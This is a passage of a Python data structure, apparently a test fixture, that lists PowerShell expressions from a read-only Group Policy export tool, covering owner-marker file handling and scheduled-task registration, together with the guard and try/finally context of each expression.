            "$stream.SafeFileHandle.DangerousGetHandle().ToInt64()",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "else of [([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT)]",
            ),
        ),
        (
            "$stream.SafeFileHandle.DangerousGetHandle()",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "else of [([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT)]",
            ),
        ),
        (
            "[uint32]::TryParse([string]$count, [ref]$links)",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "else of [([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT)]",
                "guard if (-not (Test-Path -LiteralPath $opened)) -> throw",
                "if-condition after []",
            ),
        ),
        (
            "[IO.MemoryStream]::new()",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "guard if ($links -ne 1) -> throw",
            ),
        ),
        (
            "$stream.CopyTo($bytes)",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "guard if ($links -ne 1) -> throw",
                "try",
            ),
        ),
        (
            "$bytes.ToArray()",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "guard if ($links -ne 1) -> throw",
                "try",
            ),
        ),
        (
            "$bytes.Dispose()",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "guard if ($links -ne 1) -> throw",
                "finally",
            ),
        ),
        (
            "$stream.Dispose()",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "finally",
            ),
        ),
        (
            "[IO.File]::Delete($marker)",
            (
                "function Write-GpoLensOwnerMarkerBytes",
                (
                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            (
                "[IO.File]::Open($marker, [IO.FileMode]::CreateNew, [IO.FileAccess]::Write, "
                "[IO.FileShare]::None)"
            ),
            (
                "function Write-GpoLensOwnerMarkerBytes",
                (
                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            "$stream.Write($Bytes, 0, $Bytes.Length)",
            (
                "function Write-GpoLensOwnerMarkerBytes",
                (
                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
            ),
        ),
        (
            "$stream.Dispose()",
            (
                "function Write-GpoLensOwnerMarkerBytes",
                (
                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "finally",
            ),
        ),
        (
            "(Get-Item -LiteralPath $Marker -Force -ErrorAction Stop).Attributes",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                "if-condition after []",
            ),
        ),
        (
            "[IO.FileAttributes]::ReparsePoint",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                "if-condition after []",
            ),
        ),
        (
            "[IO.FileMode]::Open",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
            ),
        ),
        (
            "[IO.FileAccess]::Read",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
            ),
        ),
        (
            "[IO.FileShare]::Read",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
            ),
        ),
        (
            "[Environment]::OSVersion.Platform",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "if-condition after []",
            ),
        ),
        (
            "[Environment]::OSVersion",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "if-condition after []",
            ),
        ),
        (
            "[PlatformID]::Win32NT",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "if-condition after []",
            ),
        ),
        (
            "$stream.SafeFileHandle",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "if ([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT) after []",
            ),
        ),
        (
            "$stream.SafeFileHandle",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "else of [([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT)]",
            ),
        ),
        (
            "$root.PSIsContainer",
            (
                "function Write-GpoLensOwnerMarkerBytes",
                "if-condition after []",
            ),
        ),
        (
            "$root.Attributes",
            (
                "function Write-GpoLensOwnerMarkerBytes",
                "if-condition after []",
            ),
        ),
        (
            "[IO.FileAttributes]::ReparsePoint",
            (
                "function Write-GpoLensOwnerMarkerBytes",
                "if-condition after []",
            ),
        ),
        (
            "$root.FullName",
            (
                "function Write-GpoLensOwnerMarkerBytes",
                (
                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            "[IO.FileMode]::CreateNew",
            (
                "function Write-GpoLensOwnerMarkerBytes",
                (
                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            "[IO.FileAccess]::Write",
            (
                "function Write-GpoLensOwnerMarkerBytes",
                (
                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            "[IO.FileShare]::None",
            (
                "function Write-GpoLensOwnerMarkerBytes",
                (
                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            "$Bytes.Length",
            (
                "function Write-GpoLensOwnerMarkerBytes",
                (
                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
            ),
        ),
    ),
    "Register-GpoLensCollection.ps1": (
        (
            "Join-Path $PSScriptRoot 'Export-GpoEstate.ps1'",
            (),
        ),
        (
            ". (Join-Path $PSScriptRoot 'GpoLensCollectionMarker.ps1')",
            (),
        ),
        (
            "Join-Path $PSScriptRoot 'GpoLensCollectionMarker.ps1'",
            (),
        ),
        (
            "Test-Path -LiteralPath $OutputRoot",
            (
                "function Set-GpoLensCollectionOwner",
                "if-condition after []",
            ),
        ),
        (
            "Get-Item -LiteralPath $OutputRoot -Force",
            (
                "function Set-GpoLensCollectionOwner",
                "if-condition after []",
            ),
        ),
        (
            "New-Item -ItemType Directory -Path $OutputRoot -Force",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            "Out-Null",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            "Join-Path $OutputRoot 'collection.lock'",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            "Join-Path $OutputRoot '.gpo-lens-collection-owner'",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
            ),
        ),
        (
            "Test-Path -LiteralPath $marker",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "if-condition after []",
            ),
        ),
        (
            "Read-GpoLensOwnerMarkerBytes -Marker $marker",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "if (Test-Path -LiteralPath $marker) after []",
            ),
        ),
        (
            (
                "Write-Warning \"Changing output root owner from '$owner' to '$TaskName'; "
                "the previous task will refuse to run. Existing exports become subject to this "
                "task's retention.\""
            ),
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "if (Test-Path -LiteralPath $marker) after []",
                (
                    "if (-not [string]::Equals($owner, $TaskName, "
                    "[StringComparison]::OrdinalIgnoreCase)) after []"
                ),
                "guard if (-not $Force) -> throw",
            ),
        ),
        (
            (
                "Write-GpoLensOwnerMarkerBytes -OutputRoot $OutputRoot -Bytes "
                "([Text.UTF8Encoding]::new($false).GetBytes($TaskName))"
            ),
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "try",
            ),
        ),
        (
            "& $RegisterTask",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "try",
            ),
        ),
        (
            "Write-GpoLensOwnerMarkerBytes -OutputRoot $OutputRoot -Bytes $previousBytes",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "catch []",
                "if ($null -ne $previousBytes) after []",
            ),
        ),
        (
            "Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "if ($Unregister) after []",
                "if ($PSCmdlet.ShouldProcess($TaskName, 'Unregister collection task')) after []",
            ),
        ),
        (
            'Write-Host "Unregistered task: $TaskName (exports and logs retained)"',
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "if ($Unregister) after []",
                "if ($PSCmdlet.ShouldProcess($TaskName, 'Unregister collection task')) after []",
            ),
        ),
        (
            "Resolve-Path -LiteralPath $CollectorPath",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
            ),
        ),
        (
            "Resolve-Path -LiteralPath (Join-Path $PSScriptRoot 'Run-GpoLensCollection.ps1')",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
            ),
        ),
        (
            "Join-Path $PSScriptRoot 'Run-GpoLensCollection.ps1'",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
            ),
        ),
        (
            "ConvertTo-GpoLensTaskArgument $runner",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
            ),
        ),
        (
            "ConvertTo-GpoLensTaskArgument $CollectorPath",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
            ),
        ),
        (
            "ConvertTo-GpoLensTaskArgument $OutputRoot",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
            ),
        ),
        (
            "ConvertTo-GpoLensTaskArgument $TaskName",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
            ),
        ),
        (
            "ConvertTo-GpoLensTaskArgument (ConvertTo-GpoLensAbsolutePath $CopyTo)",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                "if ($CopyTo) after []",
            ),
        ),
        (
            "ConvertTo-GpoLensAbsolutePath $CopyTo",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                "if ($CopyTo) after []",
            ),
        ),
        (
            "ConvertTo-GpoLensTaskArgument (ConvertTo-GpoLensAbsolutePath $InventoryPath)",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "ConvertTo-GpoLensAbsolutePath $InventoryPath",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "New-ScheduledTaskPrincipal -UserId $account -LogonType Password -RunLevel Limited",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            (
                "New-ScheduledTaskAction -Execute "
                '"$windowsRoot\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" ` -Argument '
                "$taskArgs -WorkingDirectory $PSScriptRoot"
            ),
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            "New-ScheduledTaskTrigger -Daily -DaysInterval $EveryDays -At $scheduleTime",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            (
                "New-ScheduledTaskSettingsSet -ExecutionTimeLimit $ExecutionTimeLimit ` "
                "-MultipleInstances IgnoreNew -StartWhenAvailable"
            ),
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            (
                "New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal "
                "-Settings $settings ` -Description 'Read-only GPO export, bounded retention, "
                "rotating logs and optional ZIP delivery.'"
            ),
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            (
                "Get-Credential -UserName $ServiceAccount -Message 'Collection task "
                "credentials (saved only by Windows Task Scheduler)'"
            ),
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
                "if (-not $GmsaAccount) after []",
                "if (-not $Credential) after []",
            ),
        ),
        (
            (
                "Set-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName "
                "-Force:$Force -RegisterTask { if ($GmsaAccount) { Register-ScheduledTask "
                "-TaskName $TaskName -InputObject $task -Force | Out-Null } else { "
                "Register-ScheduledTask -TaskName $TaskName -InputObject $task -User "
                "$ServiceAccount -Password $taskPassword -Force | Out-Null } }"
            ),
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
                "try",
            ),
        ),
        (
            "Register-ScheduledTask -TaskName $TaskName -InputObject $task -Force",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
                "try",
                "scriptblock -RegisterTask of Set-GpoLensCollectionOwner",
                "if ($GmsaAccount) after []",
            ),
        ),
        (
            "Out-Null",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
                "try",
                "scriptblock -RegisterTask of Set-GpoLensCollectionOwner",
                "if ($GmsaAccount) after []",
            ),
        ),
        (
            (
                "Register-ScheduledTask -TaskName $TaskName -InputObject $task -User "
                "$ServiceAccount -Password $taskPassword -Force"
            ),
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
                "try",
                "scriptblock -RegisterTask of Set-GpoLensCollectionOwner",
                "else of [($GmsaAccount)]",
            ),
        ),
        (
            "Out-Null",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
                "try",
                "scriptblock -RegisterTask of Set-GpoLensCollectionOwner",
                "else of [($GmsaAccount)]",
            ),
        ),
        (
            'Write-Host "Registered task: $TaskName"',
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            'Write-Host " Account: $account; every $EveryDays day(s) at $At (host local time)"',
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            'Write-Host " Hard time limit: $ExecutionTimeLimit; retain $Retention exports"',
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            "Write-Host \" Output: $OutputRoot; log: $(Join-Path $OutputRoot 'collection.log')\"",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            "Join-Path $OutputRoot 'collection.log'",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            'Write-Host " ZIP delivery: $CopyTo (ingest separately)"',
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
                "if ($CopyTo) after []",
            ),
        ),
        (
            "Write-Host \"Verify with: Get-ScheduledTaskInfo -TaskName '$TaskName'\"",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            "[timespan]::FromDays(365)",
            ("scriptblock in AttributeAst",),
        ),
        (
            "[timespan]::FromHours(2)",
            (),
        ),
        (
            "[IO.Path]::GetFullPath($Value)",
            (
                "function ConvertTo-GpoLensAbsolutePath",
